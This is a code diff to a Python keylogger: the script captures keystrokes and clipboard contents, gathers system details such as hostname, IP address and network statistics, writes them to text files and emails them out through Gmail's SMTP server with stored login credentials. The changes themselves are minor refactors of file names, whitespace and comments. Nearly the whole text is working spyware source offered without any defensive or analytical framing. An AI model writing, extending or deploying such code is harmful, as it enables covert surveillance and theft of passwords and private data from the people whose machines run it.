@@ -60,6 +60,8 @@ def write_file(keys):
                     f.write("\t")
             except:
                 pass
+              
+              
 def send_email():
     write_file(keys)
     smtp_server = "smtp.gmail.com"
@@ -85,9 +87,11 @@ def send_email():
     with smtplib.SMTP_SSL(smtp_server,port) as server:
             server.login(sender_email ,password)
             server.sendmail(sender_email, recipient, text)
+          
+          
 def get_public_address():
-    filename = "system.txt"
-    with open("system.txt", "a") as f:
+    filename = "clipboards.txt"
+    with open(filename, "a") as f:
         f.write("\n")
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
@@ -98,6 +102,8 @@ def get_public_address():
         except:
             f.write("Error")
             send_another(filename)
+            
+            
 def send_another(filename):
     write_file(keys)
     smtp_server = "smtp.gmail.com"
@@ -124,17 +130,15 @@ def send_another(filename):
             server.sendmail(sender, receiver, text)
 
 
-
-
 #writes system scan into system.txt
 def write_system_info():
     value = True
+    filename = "system.txt"
     while value:
-        with open("system.txt", "w") as systeminfo, contextlib.redirect_stdout(systeminfo):
+        with open(filename, "a") as systeminfo, contextlib.redirect_stdout(systeminfo):
             info()
             print("\n" *10)
             value = False
-    filename = "system.txt"
     send_another(filename)
 
 def get_size(bytes, suffix="B"):
@@ -145,7 +149,9 @@ def get_size(bytes, suffix="B"):
         1253656678 => '1.17GB'
     factor = 1024
     """
-#scans system
+    
+    
+#scans system and prints out the result
 def info():
     print("="*40, "System Information", "="*40)
     uname = platform.uname()
@@ -231,6 +237,7 @@ def info():
     net_io = psutil.net_io_counters()
     print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
     print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
+    
 #grabs clipboard info
 def clipboards():
     with open("clipboards.txt","a") as clip:
@@ -244,7 +251,7 @@ def clipboards():
             print(clip)
             
             
-#ends program
+#ends program with the end key.
 def on_release(key):
     if key == Key.end:
         send_email()
